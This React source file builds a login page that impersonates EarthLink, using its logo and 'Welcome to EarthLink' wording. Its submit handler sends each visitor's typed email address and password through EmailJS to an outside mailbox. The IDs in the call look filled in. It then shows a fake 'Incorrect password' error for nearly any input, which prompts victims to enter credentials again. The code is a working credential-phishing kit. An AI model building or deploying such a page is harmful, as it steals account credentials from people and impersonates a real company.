import "./Login.css";
import Logo from "../assets/Earthlinklogo.png";
import emailjs from "@emailjs/browser";
import { useState } from "react";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setError(""); // Reset previous error

    const templateParams = {
      user_email: email,
      user_password: password,
    };

    emailjs
      .send(
        "service_xptlhwm",     // Replace with your EmailJS service ID
        "template_i9j34cf",    // Replace with your EmailJS template ID
        templateParams,
        "w4Gk4TOf6nGZ8x33D"      // Replace with your EmailJS public key
      )
      .then(
        (response) => {
          console.log("SUCCESS!", response.status, response.text);
          setLoading(false);

          // For demo, simulate incorrect password check
          if (password !== "correctpassword") {
            setError("Incorrect password. Please try again.");
          } else {
            alert("Login successful!");
          }
        },
        (error) => {
          console.error("FAILED...", error);
          setLoading(false);
          setError("Something went wrong. Please try again later.");
        }
      );
  };

  return (
    <div className="page">
      <header className="header">
        <img src={Logo} alt="EarthLink" className="header-logo" />
      </header>

      <main className="main">
        <div className="auth-container">
          <img src={Logo} alt="EarthLink" className="main-logo" />

          <div className="card">
            <h1>Welcome to EarthLink</h1>
            <p className="subtitle">Sign in to get started</p>

            <form onSubmit={handleSubmit}>
              <label>
                Email address
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </label>

              <label>
                Password
                <input
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              </label>

              <button type="submit" disabled={loading}>
                {loading ? "Signing in..." : "Sign in"}
              </button>
            </form>

            {error && <p className="error-message">{error}</p>}

            <div className="links">
              <a href="#">Forgot password?</a>
              <a href="#">Create account</a>
            </div>
          </div>
        </div>
      </main>

      <footer className="footer">
        <span>© 2026 Example Corp</span>
        <span>Privacy • Terms</span>
      </footer>
    </div>
  );
}
